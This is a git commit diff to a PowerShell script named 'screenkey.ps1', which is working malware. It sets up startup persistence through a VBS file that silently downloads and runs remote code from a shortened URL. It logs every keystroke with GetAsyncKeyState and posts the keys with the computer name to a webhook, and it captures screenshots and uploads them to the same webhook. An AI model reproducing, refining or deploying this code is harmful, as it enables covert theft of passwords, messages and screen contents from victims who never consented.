6b6b7f8ed898207f3dd455a41b27942524f2be90
ElPichiii <90940144+ElPichiii@users.noreply.github.com>
2024-01-04 16:23:18 +0100

    Add files via upload

--- screenkey.ps1
+++ screenkey.ps1
@@ -6,7 +6,7 @@ if ($dc.Ln -ne 121) {
 $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\init.txt"
 $mkFile = "Set WshShell = WScript.CreateObject(`"WScript.Shell`")"
 $mkFile | Out-File -FilePath $pth -Force
-$mkFile = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://t.ly/o4SrC | iex`", 0, True"
+$mkFile = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://is.gd/bw_kl_to_dc | iex`", 0, True"
 $mkFile | Out-File -FilePath $pth -Append -Force
 Rename-Item -Path $pth -NewName "init.vbs" -Force
 
@@ -43,69 +43,61 @@ $KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
 # Start a continuous loop
 While ($true){
-  $keyPressed = $false
+    $keyPressed = $false
     try{
-      # Start a loop that checks the time since the last activity before a message is sent
-      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-      # Start the loop with a 30 ms delay between keystate checks
-      Start-Sleep -Milliseconds 30
-        for ($asc = 8; $asc -le 254; $asc++){
-        # Get the key state. (Is any key currently pressed)
-        $keyst = $API::GetAsyncKeyState($asc)
-          # If a key is pressed
-          if ($keyst -eq -32767) {
-          # Restart the inactivity timer
-          $keyPressed = $true
-          $LastKeypressTime.Restart()
-          $null = [console]::CapsLock
-          # Translate the keycode to a letter
-          $vtkey = $API::MapVirtualKey($asc, 3)
-          # Get the keyboard state and create a stringbuilder
-          $kbst = New-Object Byte[] 256
-          $checkkbst = $API::GetKeyboardState($kbst)
-          $logchar = New-Object -TypeName System.Text.StringBuilder
-            # Define the key that was pressed          
-            if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-              # Check for non-character keys
-              $LString = $logchar.ToString()
-                if ($asc -eq 8) {$LString = "[BKSP]"}
-                if ($asc -eq 13) {$LString = "[ENT]"}
-                if ($asc -eq 27) {$LString = "[ESC]"}
-            # Add the key to the sending variable
-            $send += $LString 
+        # Start a loop that checks the time since the last activity before a message is sent
+        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
+            # Start the loop with a 30 ms delay between keystate checks
+            Start-Sleep -Milliseconds 30
+            for ($asc = 8; $asc -le 254; $asc++){
+                # Get the key state. (Is any key currently pressed)
+                $keyst = $API::GetAsyncKeyState($asc)
+                # If a key is pressed
+                if ($keyst -eq -32767) {
+                    # Restart the inactivity timer
+                    $keyPressed = $true
+                    $LastKeypressTime.Restart()
+                    $null = [console]::CapsLock
+                    # Translate the keycode to a letter
+                    $vtkey = $API::MapVirtualKey($asc, 3)
+                    # Get the keyboard state and create a stringbuilder
+                    $kbst = New-Object Byte[] 256
+                    $checkkbst = $API::GetKeyboardState($kbst)
+                    $logchar = New-Object -TypeName System.Text.StringBuilder
+                    # Define the key that was pressed          
+                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
+                        # Check for non-character keys
+                        $LString = $logchar.ToString()
+                        if ($asc -eq 8) {$LString = "[BKSP]"}
+                        if ($asc -eq 13) {$LString = "[ENT]"}
+                        if ($asc -eq 27) {$LString = "[ESC]"}
+                        # Add the key to the sending variable
+                        $send += $LString 
+                    }
+                }
             }
-          }
         }
-      }
     }
     finally{
-      If ($keyPressed) {
-      # Send the saved keys to a webhook
-      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
-      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
-      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
-      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-      # Remove the log file and reset the inactivity check 
-      $send = ""
-      $keyPressed = $false
-      }
+        If ($keyPressed) {
+            # Send the saved keys to a webhook
+            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+            $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
+            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
+            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
+            # Remove the log file and reset the inactivity check 
+            $send = ""
+            $keyPressed = $false
+        }
     }
-  # Reset the stopwatch before restarting the loop
-  $LastKeypressTime.Restart()
-  Start-Sleep -Milliseconds 10
+    # Reset the stopwatch before restarting the loop
+    $LastKeypressTime.Restart()
+    Start-Sleep -Milliseconds 10
 }
 
-# Script 2
-$hookurl = "$dc"
 $seconds = 30 # Screenshot interval
 $a = 1 # Screenshot amount
-
-# Shortened URL Detection
-if ($hookurl.Ln -ne 121) {
-    Write-Host "Shortened Webhook URL Detected.."
-    $hookurl = (irm $hookurl).url
-}
 
 While ($a -gt 0) {
     $Filett = "$env:temp\SC.png"
@@ -121,9 +113,9 @@ While ($a -gt 0) {
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    curl.exe -F "file1=@$filett" $hookurl
+    Invoke-RestMethod -Uri $dc -Method Post -InFile $Filett -ContentType "multipart/form-data"
     Start-Sleep 1
-    Remove-Item -Path $filett
+    Remove-Item -Path $Filett
     Start-Sleep $seconds
     $a--
 }
